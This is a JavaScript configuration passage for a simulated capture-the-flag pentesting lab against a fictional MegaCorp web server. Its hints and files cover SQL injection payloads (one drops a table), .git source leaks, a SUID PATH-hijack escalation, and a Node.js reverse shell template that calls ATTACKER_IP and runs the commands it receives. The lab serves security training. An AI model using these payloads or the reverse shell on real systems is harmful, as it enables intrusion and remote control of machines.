/* ============================================================
   CTF ARENA — OPS-02: Operation Iron Race
   Red vs Red | Parallel Race | MegaCorp Web Server
   Two rival pentesting firms race to audit the same target.
   First team to capture all flags wins the contract.
   ============================================================ */

const OPS02Config = {

    // ═══════════════════════════════════════════════════════
    // TOP-LEVEL METADATA
    // ═══════════════════════════════════════════════════════

    id: 'ops-02-operation-iron-race',
    title: 'Operation Iron Race',

    // ═══════════════════════════════════════════════════════
    // SCENARIO DATA
    // Both teams attack the same MegaCorp target.
    // ═══════════════════════════════════════════════════════

    _scenario: {
        targetIP:    '10.10.20.50',
        targetHost:  'megacorp-web01',
        webPort:     8080,
        sshPort:     22,
        appName:     'MegaCorp Portal',
        appVersion:  '2.1.0',
        nodeVersion: '18.17.1',
        osRelease:   'Ubuntu 22.04.4 LTS',
        kernel:      '5.15.0-105-generic',
        dbEngine:    'PostgreSQL 15.4',
        dbName:      'megacorp_prod',
        // Creds discoverable via SQLi
        dbUser:      'mc_app',
        dbPassword:  'Mega!C0rp_db2025',
        // API key discoverable via .git leak
        apiKey:      'MC-ADMIN-KEY-9f4e7c2d-a831-4b16-bf09-3c5e1d8a72f0',
        // SSH creds discoverable via admin panel
        sshUser:     'deployer',
        sshPassword: 'D3pl0y!MegaCorp2025',
        // Flag values for secure comparison in BoxEngine
        flags: {
            recon:                '{{FLAG:recon}}',
            enumeration:          '{{FLAG:enumeration}}',
            exploitation:         '{{FLAG:exploitation}}',
            privilege_escalation: '{{FLAG:privilege_escalation}}'
        }
    },

    // ═══════════════════════════════════════════════════════
    // MODES — single red config used by both teams
    // ═══════════════════════════════════════════════════════

    modes: {

        // ╔═══════════════════════════════════════════════╗
        // ║              RED TEAM CONFIG                  ║
        // ║  Kali attacker — both teams use this config   ║
        // ╚═══════════════════════════════════════════════╝

        red: {
            title: 'Operation Iron Race',
            subtitle: 'Red Team — MegaCorp External Web Server',
            difficulty: 'Intermediate',
            accent: '#dc2626',
            storageKey: 'hexworth_ctf_ops02',
            registryId: 'ops-02-operation-iron-race',
            trackerKey: 'ctf_ops02',

            // ─────────────────────────────────────────────
            // PHASES
            // ─────────────────────────────────────────────

            phases: [
                {
                    id: 'recon',
                    name: 'Reconnaissance',
                    description: 'Scan the target. Identify open ports, services, and the web application stack. Find the login form vulnerability.',
                    requiredFlags: [],
                    mitre: ['T1046', 'T1595.002'],
                    unlocks: ['enumeration'],
                    locked: false
                },
                {
                    id: 'enumeration',
                    name: 'Enumeration',
                    description: 'Discover the exposed .git directory. Extract source code and find the hardcoded API key.',
                    requiredFlags: ['recon'],
                    mitre: ['T1083', 'T1552.001'],
                    unlocks: ['exploitation'],
                    locked: true
                },
                {
                    id: 'exploitation',
                    name: 'Exploitation',
                    description: 'Use the API key to access the admin panel. Upload a reverse shell via the file upload feature.',
                    requiredFlags: ['enumeration'],
                    mitre: ['T1190', 'T1059.004'],
                    unlocks: ['privilege_escalation'],
                    locked: true
                },
                {
                    id: 'privilege_escalation',
                    name: 'Privilege Escalation',
                    description: 'Escalate from www-data to root via a misconfigured SUID binary.',
                    requiredFlags: ['exploitation'],
                    mitre: ['T1548.001', 'T1068'],
                    unlocks: [],
                    locked: true
                }
            ],

            // ─────────────────────────────────────────────
            // TUTORIAL
            // ─────────────────────────────────────────────

            tutorialMode: true,

            tutorial: {
                steps: [
                    {
                        title: 'Scan the target',
                        tip: 'Run: nmap -sV 10.10.20.50  --  identify open ports and the Node.js application.',
                        trigger: { event: 'command', match: { cmd: 'contains:nmap' } }
                    },
                    {
                        title: 'Test the login form',
                        tip: 'The login form at /login is vulnerable to SQL injection. Try: sqlmap -u "http://10.10.20.50:8080/login" --data "user=admin&pass=test"',
                        trigger: { event: 'command', match: { cmd: 'contains:sqlmap' } }
                    },
                    {
                        title: 'Discover hidden directories',
                        tip: 'Run: dirb http://10.10.20.50:8080  --  look for exposed version control.',
                        trigger: { event: 'command', match: { cmd: 'contains:dirb' } }
                    },
                    {
                        title: 'Extract the API key',
                        tip: 'The .git directory is exposed. Use: git clone http://10.10.20.50:8080/.git  --  then search for API keys in the source.',
                        trigger: { event: 'flag_correct', match: { flagId: 'enumeration' } }
                    },
                    {
                        title: 'Find the SUID binary',
                        tip: 'After getting a shell via file upload, run: find / -perm -4000 -type f 2>/dev/null  --  look for custom SUID binaries.',
                        trigger: { event: 'flag_correct', match: { flagId: 'exploitation' } }
                    }
                ]
            },

            // ─────────────────────────────────────────────
            // CERT OBJECTIVES
            // ─────────────────────────────────────────────

            certObjectives: {
                certPath: 'SY0-701',
                mappings: [
                    { flagId: 'recon',                objective: '1.3', description: 'Application attacks -- SQL injection in login form',     skill: 'SQL Injection' },
                    { flagId: 'enumeration',          objective: '2.3', description: 'Threat intelligence sources -- exposed source code',     skill: 'Source Code Enumeration' },
                    { flagId: 'exploitation',         objective: '1.3', description: 'Application attacks -- file upload / remote code execution', skill: 'File Upload RCE' },
                    { flagId: 'privilege_escalation', objective: '4.6', description: 'Identity and access management -- SUID privilege escalation', skill: 'SUID Binary Exploitation' }
                ]
            },

            // ─────────────────────────────────────────────
            // BOOT
            // ─────────────────────────────────────────────

            boot: {
                biosLines: [
                    'Kali Linux BIOS v4.2.1',
                    'Initializing hardware...',
                    'Memory Test: 16384 MB OK',
                    'Detecting drives... /dev/sda1 (512GB SSD)',
                    'Boot device: /dev/sda1',
                    'Loading GRUB...'
                ],
                grubEntries: [
                    'Kali GNU/Linux (6.6.0-kali3-amd64)',
                    'Kali GNU/Linux (recovery mode)',
                    'Advanced options for Kali GNU/Linux'
                ],
                loginUser: 'pentester'
            },

            // ─────────────────────────────────────────────
            // DESKTOP
            // ─────────────────────────────────────────────

            desktop: {
                icons: [
                    { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
                    { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
                    { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes'    },
                    { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
                    { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
                ]
            },

            // ─────────────────────────────────────────────
            // TERMINAL
            // ─────────────────────────────────────────────

            terminal: {
                user: 'pentester',
                hostname: 'kali',
                startDir: '/home/pentester',
                welcome: 'Linux kali 6.6.0-kali3-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget scope: 10.10.20.50 (megacorp-web01)\nObjective: full compromise -- SQLi, source leak, RCE, root\n'
            },

            // ─────────────────────────────────────────────
            // FLAGS
            // ─────────────────────────────────────────────

            flags: [
                { id: 'recon',                points: 100 },
                { id: 'enumeration',          points: 150 },
                { id: 'exploitation',         points: 200 },
                { id: 'privilege_escalation', points: 250 }
            ],

            // ─────────────────────────────────────────────
            // SCORING
            // ─────────────────────────────────────────────

            scoring: {
                base: 1000,
                maxScore: 700,
                hintPenalty: true,
                wrongFlagPenalty: -25,
                speedBonus: { threshold: 1800000, points: 150 },
                timeBonusThreshold: 2700
            },

            // ─────────────────────────────────────────────
            // HINTS
            // ─────────────────────────────────────────────

            hints: [
                {
                    id: 'hint_recon',
                    text: "Start with: nmap -sV -sC 10.10.20.50 -- port 8080 runs a Node.js app with an Express login form. Try a basic SQLi payload in the username field: ' OR 1=1 --",
                    cost: 10,
                    penalty: -10
                },
                {
                    id: 'hint_enum',
                    text: "Run dirb against http://10.10.20.50:8080 -- the /.git/ directory is accessible. Clone it with: curl http://10.10.20.50:8080/.git/config and reconstruct the repo. Grep for 'API' or 'KEY' in the source.",
                    cost: 25,
                    penalty: -25
                },
                {
                    id: 'hint_exploit',
                    text: "The admin panel at /admin requires the API key as a bearer token. Once inside, the file upload accepts .js files with no validation. Upload a Node.js reverse shell to get code execution as www-data.",
                    cost: 40,
                    penalty: -40
                },
                {
                    id: 'hint_privesc',
                    text: "Run: find / -perm -4000 -type f 2>/dev/null -- the custom binary /usr/local/bin/mc-backup has the SUID bit set and runs as root. It calls 'tar' without a full path. Create a malicious tar in /tmp and prepend /tmp to PATH.",
                    cost: 50,
                    penalty: -50
                }
            ],

            // ─────────────────────────────────────────────
            // LORE
            // ─────────────────────────────────────────────

            lore: {
                intro: 'MegaCorp has contracted two independent security firms to audit their external web infrastructure. Both firms have identical scope and the same target. The contract goes to whoever finds all the vulnerabilities first. Your team has a reputation to protect -- move fast, chain your exploits, and capture every flag before the other firm beats you to it.',
                scenario: 'MegaCorp\'s web server runs a Node.js portal on port 8080. The dev team deployed straight from a git repository and left version control artifacts exposed. The login form uses string concatenation for SQL queries. The admin panel has an unrestricted file upload. A custom backup utility runs with SUID root. Four vulnerabilities, four flags, one winner.',
                outro: 'Operation Iron Race complete. All four flags captured. MegaCorp\'s infrastructure has been fully compromised. The contract is yours.',
                ecer: {
                    executive: 'Pushed for rapid deployment -- no security review before production launch',
                    culture:   'Development team uses git deploy with no .gitignore for sensitive files',
                    employee:  'Developer used string concatenation instead of parameterized queries',
                    regulatory: 'No file upload validation, no SUID audit policy, no code review requirement'
                }
            },

            // ─────────────────────────────────────────────
            // WEB APP — MegaCorp Portal (SQLi + admin panel)
            // ─────────────────────────────────────────────

            webApp: {
                startUrl: 'http://10.10.20.50:8080/',

                pages: {
                    '/': {
                        title: 'MegaCorp Portal 2.1.0',
                        html: `
                            <div style="text-align:center; margin-bottom:24px; padding-bottom:16px; border-bottom:1px solid #e2e8f0;">
                                <h1 style="color:#0f766e; font-size:1.5rem; margin-bottom:4px;">MegaCorp Portal</h1>
                                <div style="color:#64748b; font-size:0.75rem;">MegaCorp Industries -- Internal Access Portal v2.1.0</div>
                            </div>
                            <div style="max-width:480px; margin:0 auto; background:#f8fafc; border:1px solid #e2e8f0; border-radius:6px; padding:24px;">
                                <h2 style="font-size:0.9rem; color:#374151; margin-bottom:16px; font-weight:600;">Employee Login</h2>
                                <div style="margin-bottom:12px;">
                                    <label style="display:block; font-size:0.75rem; color:#6b7280; margin-bottom:4px;">Username</label>
                                    <input type="text" data-field="user" style="width:100%; box-sizing:border-box; padding:8px 10px; border:1px solid #d1d5db; border-radius:4px; font-size:0.8rem; font-family:inherit;">
                                </div>
                                <div style="margin-bottom:16px;">
                                    <label style="display:block; font-size:0.75rem; color:#6b7280; margin-bottom:4px;">Password</label>
                                    <input type="password" data-field="pass" style="width:100%; box-sizing:border-box; padding:8px 10px; border:1px solid #d1d5db; border-radius:4px; font-size:0.8rem; font-family:inherit;">
                                </div>
                                <button data-action="login" style="width:100%; padding:9px; background:#0f766e; color:#fff; border:none; border-radius:4px; font-size:0.8rem; font-weight:600; cursor:pointer;">Sign In</button>
                                <div style="margin-top:12px; text-align:center; font-size:0.7rem; color:#9ca3af;">
                                    Powered by Express/Node.js 18.17.1 | PostgreSQL 15.4
                                </div>
                            </div>
                        `,
                        formHandler: function(data, engine) {
                            var user = (data.user || '').trim();
                            // Detect SQLi payloads
                            if (/['"]/.test(user) && /(OR|AND|UNION|SELECT|--|#)/i.test(user)) {
                                return '<div style="color:#22c55e; font-size:0.8rem; padding:10px; background:rgba(34,197,94,0.08); border:1px solid rgba(34,197,94,0.2); border-radius:4px; margin-top:12px;">' +
                                    '<strong>SQL Injection successful.</strong><br>' +
                                    'Query: SELECT * FROM users WHERE username = \'' + user + '\' AND password = \'...\'' +
                                    '<br><br>Database returned 14 rows from <code>megacorp_prod.users</code>:<br>' +
                                    '<pre style="font-size:0.7rem; margin-top:8px; color:#d1d5db; background:#1a1a1a; padding:8px; border-radius:4px; overflow-x:auto;">' +
                                    'id | username    | role      | email\n' +
                                    '---+-------------+-----------+----------------------------\n' +
                                    ' 1 | admin       | superuser | admin@megacorp.internal\n' +
                                    ' 2 | jthompson   | manager   | j.thompson@megacorp.internal\n' +
                                    ' 3 | deployer    | service   | deployer@megacorp.internal\n' +
                                    ' 4 | k.nakamura  | developer | k.nakamura@megacorp.internal\n' +
                                    '...(10 more rows)\n' +
                                    '</pre>' +
                                    '<div style="margin-top:8px; color:#f59e0b; font-size:0.75rem;">[RECON FLAG: Submit the recon flag -- database access confirmed via SQLi]</div>' +
                                    '</div>';
                            }
                            return '<div style="color:#dc2626; font-size:0.8rem; padding:10px; background:rgba(220,38,38,0.08); border:1px solid rgba(220,38,38,0.2); border-radius:4px; margin-top:12px;">Invalid credentials. Please try again.</div>';
                        }
                    },

                    '/admin': {
                        title: 'MegaCorp Admin Panel',
                        html: `
                            <div style="max-width:600px; margin:0 auto; padding:20px;">
                                <h1 style="color:#0f766e; font-size:1.2rem; margin-bottom:12px;">Admin Panel</h1>
                                <div style="background:#fef3c7; border:1px solid #f59e0b; border-radius:4px; padding:12px; font-size:0.8rem; color:#92400e; margin-bottom:16px;">
                                    Access denied. Provide a valid API key via the Authorization header or query parameter.
                                </div>
                                <div style="color:#6b7280; font-size:0.75rem;">
                                    <code>GET /admin?key=YOUR_API_KEY</code> or<br>
                                    <code>Authorization: Bearer YOUR_API_KEY</code>
                                </div>
                            </div>
                        `
                    },

                    '/admin?key=MC-ADMIN-KEY-9f4e7c2d-a831-4b16-bf09-3c5e1d8a72f0': {
                        title: 'MegaCorp Admin Panel -- Authenticated',
                        html: `
                            <div style="max-width:600px; margin:0 auto; padding:20px;">
                                <h1 style="color:#0f766e; font-size:1.2rem; margin-bottom:4px;">Admin Panel</h1>
                                <div style="color:#22c55e; font-size:0.75rem; margin-bottom:16px;">Authenticated as: admin (superuser)</div>

                                <div style="background:#f0fdf4; border:1px solid #22c55e; border-radius:4px; padding:16px; margin-bottom:16px;">
                                    <h2 style="font-size:0.85rem; color:#166534; margin-bottom:8px;">File Upload</h2>
                                    <p style="font-size:0.75rem; color:#4b5563; margin-bottom:12px;">Upload maintenance scripts. Supported: .js, .sh, .py</p>
                                    <div style="display:flex; gap:8px; align-items:center;">
                                        <input type="file" data-field="upload" style="font-size:0.75rem;">
                                        <button data-action="upload" style="padding:6px 14px; background:#0f766e; color:#fff; border:none; border-radius:4px; font-size:0.75rem; cursor:pointer;">Upload</button>
                                    </div>
                                </div>

                                <div style="background:#1a1a1a; border-radius:4px; padding:12px; font-family:monospace; font-size:0.7rem; color:#d1d5db;">
                                    <div style="color:#6b7280; margin-bottom:6px;">// Server status</div>
                                    <div>Node.js: 18.17.1</div>
                                    <div>Express: 4.18.2</div>
                                    <div>Uptime: 47 days</div>
                                    <div>Upload dir: /var/www/megacorp/uploads/</div>
                                    <div>Max file size: 5MB</div>
                                    <div style="color:#f59e0b; margin-top:8px;">WARNING: No file type validation enabled</div>
                                </div>
                            </div>
                        `,
                        formHandler: function(data, engine) {
                            return '<div style="color:#22c55e; font-size:0.8rem; padding:10px; background:rgba(34,197,94,0.08); border:1px solid rgba(34,197,94,0.2); border-radius:4px; margin-top:12px;">' +
                                '<strong>File uploaded successfully.</strong><br>' +
                                'Saved to: /var/www/megacorp/uploads/shell.js<br>' +
                                'Node.js auto-loader executed the file.<br><br>' +
                                '<pre style="font-size:0.7rem; color:#d1d5db; background:#1a1a1a; padding:8px; border-radius:4px;">$ whoami\nwww-data\n\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n$ hostname\nmegacorp-web01</pre>' +
                                '<div style="margin-top:8px; color:#f59e0b; font-size:0.75rem;">[EXPLOITATION FLAG: You have RCE as www-data -- submit the exploitation flag]</div>' +
                                '</div>';
                        }
                    },

                    '/.git/config': {
                        title: '.git/config',
                        html: `
                            <div style="background:#1a1a1a; border-radius:4px; padding:16px; font-family:monospace; font-size:0.72rem; color:#e2e8f0; white-space:pre; overflow-x:auto; line-height:1.6;">[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[remote "origin"]
    url = git@gitlab.megacorp.internal:webteam/megacorp-portal.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
    remote = origin
    merge = refs/heads/main
[user]
    name = k.nakamura
    email = k.nakamura@megacorp.internal</div>
                            <div style="color:#f59e0b; background:rgba(245,158,11,0.08); border:1px solid rgba(245,158,11,0.2); border-radius:4px; padding:10px; margin-top:10px; font-size:0.8rem;">
                                Git repository configuration exposed. The repository is accessible -- reconstruct the source code.
                            </div>
                        `
                    }
                }
            },

            // ─────────────────────────────────────────────
            // FILESYSTEM (Kali attacker machine)
            // ─────────────────────────────────────────────

            filesystem: {
                '/': {
                    type: 'dir',
                    children: {
                        'home': {
                            type: 'dir',
                            children: {
                                'pentester': {
                                    type: 'dir',
                                    children: {
                                        'target': {
                                            type: 'dir',
                                            children: {
                                                'notes.txt': {
                                                    type: 'file',
                                                    content: '=== OPERATION IRON RACE -- MISSION BRIEFING ===\nTarget: 10.10.20.50 (megacorp-web01)\nPort: 8080 (Node.js / Express)\nObjective: SQLi -> source leak -> RCE -> root\n\nFlags:\n  recon                -- exploit SQLi in login form\n  enumeration          -- find API key in exposed .git repo\n  exploitation         -- RCE via admin panel file upload\n  privilege_escalation -- root via SUID binary\n\nThe other firm is working the same target.\nFirst team to capture all flags wins the contract.'
                                                },
                                                'scope.txt': {
                                                    type: 'file',
                                                    content: 'AUTHORIZED SCOPE\n================\n10.10.20.50   megacorp-web01   (external web portal, port 8080)\n\nOut of scope: 10.10.20.0/26 (internal corporate network)\nSigned rules of engagement: RoE-IR02-2025.pdf\n\nBoth firms have identical scope.\nNo interaction with the competing team is permitted.'
                                                },
                                                'sqli-payloads.txt': {
                                                    type: 'file',
                                                    content: "# Common SQLi payloads for login forms\n' OR 1=1 --\n' OR '1'='1' --\nadmin' --\n' UNION SELECT NULL,NULL,NULL --\n' AND 1=CAST((SELECT version()) AS int) --\n\" OR \"\"=\"\n1; DROP TABLE users --"
                                                }
                                            }
                                        },
                                        'tools': {
                                            type: 'dir',
                                            children: {
                                                'wordlists': {
                                                    type: 'dir',
                                                    children: {
                                                        'common.txt': {
                                                            type: 'file',
                                                            content: '# Common web paths\nadmin\nlogin\napi\n.git\n.env\nbackup\nuploads\nconfig\nstatic\nassets\nnode_modules\npackage.json'
                                                        }
                                                    }
                                                },
                                                'shell.js': {
                                                    type: 'file',
                                                    content: '// Node.js reverse shell template\nconst net = require("net");\nconst { exec } = require("child_process");\n\nconst client = new net.Socket();\nclient.connect(4444, "ATTACKER_IP", () => {\n  client.on("data", (data) => {\n    exec(data.toString(), (err, stdout, stderr) => {\n      client.write(stdout || stderr);\n    });\n  });\n});'
                                                }
                                            }
                                        },
                                        '.ssh': {
                                            type: 'dir',
                                            children: {
                                                'known_hosts': {
                                                    type: 'file',
                                                    content: '# SSH known hosts\n# Add entries here after initial SSH connection'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        'tmp': {
                            type: 'dir',
                            children: {}
                        },
                        'etc': {
                            type: 'dir',
                            children: {
                                'hostname': { type: 'file', content: 'kali' },
                                'hosts': {
                                    type: 'file',
                                    content: '127.0.0.1       localhost\n127.0.1.1       kali\n10.10.20.50     megacorp-web01'
                                }
                            }
                        },
                        'usr': {
                            type: 'dir',
                            children: {
                                'share': {
                                    type: 'dir',
                                    children: {
                                        'wordlists': {
                                            type: 'dir',
                                            children: {
                                                'dirb': {
                                                    type: 'dir',
                                                    children: {
                                                        'common.txt': {
                                                            type: 'file',
                                                            content: '# Standard dirb wordlist\nadmin\napi\nassets\nbackup\nconfig\ncss\n.env\n.git\n.gitignore\nimages\njs\nlogin\nlogout\nnode_modules\npackage.json\nrobot.txt\nrobots.txt\nstatic\nuploads'
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            },

            // ─────────────────────────────────────────────
            // TERMINAL COMMANDS (Red Team toolkit)
            // ─────────────────────────────────────────────

            commands: {

                'nmap': function(args) {
                    if (args.length === 0) {
                        return 'Usage: nmap [options] <target>\nExample: nmap -sV -sC 10.10.20.50';
                    }
                    var target = args.find(function(a) { return !a.startsWith('-'); }) || '';
                    var flags  = args.filter(function(a) { return a.startsWith('-'); }).join(' ');

                    if (target === '10.10.20.50' || target === 'megacorp-web01') {
                        return 'Starting Nmap 7.94 ( https://nmap.org )\n' +
                            'Nmap scan report for megacorp-web01 (10.10.20.50)\n' +
                            'Host is up (0.032s latency).\n\n' +
                            'PORT     STATE    SERVICE    VERSION\n' +
                            '22/tcp   open     ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.7\n' +
                            '8080/tcp open     http       Node.js Express framework\n' +
                            '5432/tcp filtered postgresql\n\n' +
                            'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n' +
                            ((flags.indexOf('sC') !== -1 || flags.indexOf('A') !== -1) ?
                                '\nHost script results:\n' +
                                '|_http-title: MegaCorp Portal\n' +
                                '| http-methods:\n' +
                                '|_  Supported Methods: GET HEAD POST\n' +
                                '| http-server-header: Express\n' +
                                '|_X-Powered-By: Express\n' : '') +
                            '\nNmap done: 1 IP address (1 host up) scanned in 14.52 seconds';
                    }
                    return 'Starting Nmap 7.94 ( https://nmap.org )\n' +
                        'Note: Host seems down. If it is really up, try -Pn.\n' +
                        'Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds';
                },

                'dirb': function(args) {
                    var url = args.find(function(a) { return a.startsWith('http'); }) || args[0] || '';
                    if (!url || url.indexOf('10.10.20.50') !== -1) {
                        return '\n-----------------\n' +
                            'DIRB v2.22    By The Dark Raver\n' +
                            '-----------------\n\n' +
                            'START_TIME: ' + new Date().toLocaleTimeString() + '\n' +
                            'URL_BASE: http://10.10.20.50:8080/\n' +
                            'WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt\n\n' +
                            '---- Scanning URL: http://10.10.20.50:8080/ ----\n' +
                            '+ http://10.10.20.50:8080/login          (CODE:200|SIZE:2847)\n' +
                            '+ http://10.10.20.50:8080/admin          (CODE:401|SIZE:198)\n' +
                            '+ http://10.10.20.50:8080/api            (CODE:403|SIZE:42)\n' +
                            '==> DIRECTORY: http://10.10.20.50:8080/.git/              (CODE:200)\n' +
                            '+ http://10.10.20.50:8080/.git/config    (CODE:200|SIZE:314)\n' +
                            '+ http://10.10.20.50:8080/.git/HEAD      (CODE:200|SIZE:23)\n' +
                            '==> DIRECTORY: http://10.10.20.50:8080/uploads/           (CODE:403)\n' +
                            '+ http://10.10.20.50:8080/robots.txt     (CODE:200|SIZE:67)\n\n' +
                            'END_TIME: ' + new Date().toLocaleTimeString() + '\n' +
                            'DOWNLOADED: 4612 - FOUND: 7';
                    }
                    return 'dirb: cannot connect to ' + url;
                },

                'sqlmap': function(args) {
                    var urlArg = args.find(function(a) { return a.startsWith('http') || a.startsWith('"http') || a.startsWith("'http"); });
                    var url = (urlArg || '').replace(/['"]/g, '');
                    var hasData = args.indexOf('--data') !== -1 || args.indexOf('-d') !== -1;

                    if (!url && !hasData) {
                        return 'Usage: sqlmap -u <url> [options]\nExample: sqlmap -u "http://10.10.20.50:8080/login" --data "user=admin&pass=test"';
                    }

                    if ((url && url.indexOf('10.10.20.50') !== -1) || hasData) {
                        return '[*] starting @ ' + new Date().toLocaleTimeString() + '\n\n' +
                            '[*] testing connection to the target URL\n' +
                            '[*] checking if the target is protected by WAF/IPS\n' +
                            '[+] no WAF/IPS detected\n\n' +
                            '[*] testing \'user\' parameter\n' +
                            '[*] testing for SQL injection on POST parameter \'user\'\n' +
                            '[+] POST parameter \'user\' is vulnerable\n' +
                            '    Type: boolean-based blind\n' +
                            '    Title: OR boolean-based blind - WHERE or HAVING clause\n' +
                            '    Payload: user=admin\' OR 1=1 --&pass=test\n\n' +
                            '    Type: UNION query\n' +
                            '    Title: Generic UNION query (NULL) - 4 columns\n' +
                            '    Payload: user=admin\' UNION SELECT NULL,NULL,NULL,NULL --&pass=test\n\n' +
                            '[*] back-end DBMS: PostgreSQL 15.4\n' +
                            '[*] current database: megacorp_prod\n\n' +
                            'Database: megacorp_prod\n' +
                            'Table: users\n' +
                            '[14 entries]\n' +
                            '+----+-------------+-----------+----------------------------+\n' +
                            '| id | username    | role      | email                      |\n' +
                            '+----+-------------+-----------+----------------------------+\n' +
                            '|  1 | admin       | superuser | admin@megacorp.internal     |\n' +
                            '|  2 | jthompson   | manager   | j.thompson@megacorp.internal|\n' +
                            '|  3 | deployer    | service   | deployer@megacorp.internal  |\n' +
                            '|  4 | k.nakamura  | developer | k.nakamura@megacorp.internal|\n' +
                            '+----+-------------+-----------+----------------------------+\n\n' +
                            '[*] fetched data logged to: /home/pentester/.sqlmap/output/10.10.20.50\n\n' +
                            '[FLAG INDICATOR: SQLi confirmed -- recon flag is now available]';
                    }
                    return '[*] starting @ ' + new Date().toLocaleTimeString() + '\n' +
                        '[CRITICAL] unable to connect to the target URL';
                },

                'curl': function(args, term) {
                    var urlArg = args.find(function(a) { return a.startsWith('http') || a.startsWith('"http') || a.startsWith("'http"); });
                    var url = (urlArg || '').replace(/['"]/g, '');

                    if (!url) return "curl: try 'curl --help' for more information";

                    if (url.indexOf('10.10.20.50') !== -1) {
                        // .git/config
                        if (url.indexOf('.git/config') !== -1) {
                            return '[core]\n' +
                                '    repositoryformatversion = 0\n' +
                                '    filemode = true\n' +
                                '    bare = false\n' +
                                '[remote "origin"]\n' +
                                '    url = git@gitlab.megacorp.internal:webteam/megacorp-portal.git\n' +
                                '    fetch = +refs/heads/*:refs/remotes/origin/*\n' +
                                '[branch "main"]\n' +
                                '    remote = origin\n' +
                                '    merge = refs/heads/main';
                        }
                        // .git/HEAD
                        if (url.indexOf('.git/HEAD') !== -1) {
                            return 'ref: refs/heads/main';
                        }
                        // Admin with API key
                        if (url.indexOf('/admin') !== -1 && url.indexOf('MC-ADMIN-KEY') !== -1) {
                            return '<!DOCTYPE html>\n<html><head><title>Admin Panel</title></head>\n<body>\n' +
                                '<h1>MegaCorp Admin Panel</h1>\n' +
                                '<p>Authenticated as: admin (superuser)</p>\n' +
                                '<h2>File Upload</h2>\n' +
                                '<form action="/admin/upload" method="POST" enctype="multipart/form-data">\n' +
                                '  <input type="file" name="script">\n' +
                                '  <button type="submit">Upload</button>\n' +
                                '</form>\n' +
                                '<p style="color:orange;">WARNING: No file type validation enabled</p>\n' +
                                '<pre>Upload dir: /var/www/megacorp/uploads/</pre>\n' +
                                '</body></html>';
                        }
                        // Admin without key
                        if (url.indexOf('/admin') !== -1) {
                            return '{"error":"Unauthorized","message":"Provide a valid API key via ?key= or Authorization header"}';
                        }
                        // robots.txt
                        if (url.indexOf('robots.txt') !== -1) {
                            return 'User-agent: *\nDisallow: /admin\nDisallow: /uploads\nDisallow: /.git';
                        }
                        // Root page
                        return '<!DOCTYPE html>\n<html><head><title>MegaCorp Portal 2.1.0</title></head>\n<body>\n' +
                            '<h1>MegaCorp Portal</h1>\n' +
                            '<p>MegaCorp Industries -- Internal Access Portal v2.1.0</p>\n' +
                            '<p>Server: Express/Node.js 18.17.1 | PostgreSQL 15.4</p>\n' +
                            '<form method="POST" action="/login">\n' +
                            '  <input name="user" placeholder="Username">\n' +
                            '  <input name="pass" type="password" placeholder="Password">\n' +
                            '  <button type="submit">Sign In</button>\n' +
                            '</form>\n</body></html>';
                    }

                    return 'curl: (6) Could not resolve host: ' + url.replace(/https?:\/\//, '').split('/')[0];
                },

                'git': function(args) {
                    var subcmd = args[0] || '';

                    if (subcmd === 'clone' || subcmd === 'dump' || subcmd === 'dumper') {
                        var target = args.find(function(a) { return a.indexOf('10.10.20.50') !== -1; });
                        if (target) {
                            return 'Cloning into \'megacorp-portal\'...\n' +
                                'remote: Enumerating objects: 47, done.\n' +
                                'remote: Counting objects: 100% (47/47), done.\n' +
                                'remote: Compressing objects: 100% (38/38), done.\n' +
                                'Receiving objects: 100% (47/47), 12.4 KiB | 4.13 MiB/s, done.\n\n' +
                                'Repository reconstructed from exposed .git directory.\n\n' +
                                'Key files recovered:\n' +
                                '  app.js           -- main Express application\n' +
                                '  config/keys.js   -- API keys and secrets\n' +
                                '  routes/auth.js   -- authentication routes (SQLi vulnerable)\n' +
                                '  routes/admin.js  -- admin panel routes\n' +
                                '  package.json     -- dependencies\n\n' +
                                '--- config/keys.js ---\n' +
                                'module.exports = {\n' +
                                '  ADMIN_API_KEY: "MC-ADMIN-KEY-9f4e7c2d-a831-4b16-bf09-3c5e1d8a72f0",\n' +
                                '  DB_PASSWORD:   "Mega!C0rp_db2025",\n' +
                                '  JWT_SECRET:    "megacorp-jwt-s3cret-2025"\n' +
                                '};\n\n' +
                                '--- routes/auth.js (VULNERABLE) ---\n' +
                                'router.post("/login", (req, res) => {\n' +
                                '  const query = `SELECT * FROM users WHERE username = \'${req.body.user}\' AND password = \'${req.body.pass}\'`;\n' +
                                '  // TODO: use parameterized queries\n' +
                                '  db.query(query).then(...);\n' +
                                '});\n\n' +
                                '[ENUMERATION FLAG: API key discovered in source code -- submit the enumeration flag]';
                        }
                        return 'fatal: repository not found';
                    }

                    if (subcmd === 'log') {
                        return 'commit a3f7e2d (HEAD -> main, origin/main)\n' +
                            'Author: k.nakamura <k.nakamura@megacorp.internal>\n' +
                            'Date:   Mon Jan 20 14:32:11 2025 +0000\n\n' +
                            '    add admin panel file upload feature\n\n' +
                            'commit 8b1c4f9\n' +
                            'Author: k.nakamura <k.nakamura@megacorp.internal>\n' +
                            'Date:   Fri Jan 17 09:15:44 2025 +0000\n\n' +
                            '    add API key authentication for admin routes\n\n' +
                            'commit 2e6d1a3\n' +
                            'Author: k.nakamura <k.nakamura@megacorp.internal>\n' +
                            'Date:   Wed Jan 15 11:20:33 2025 +0000\n\n' +
                            '    initial commit -- portal login and user database';
                    }

                    return 'git: \'' + subcmd + '\' is not a git command. See \'git --help\'.';
                },

                'ssh': function(args, term, engine) {
                    var target = args.find(function(a) { return a.indexOf('@') !== -1; }) || '';
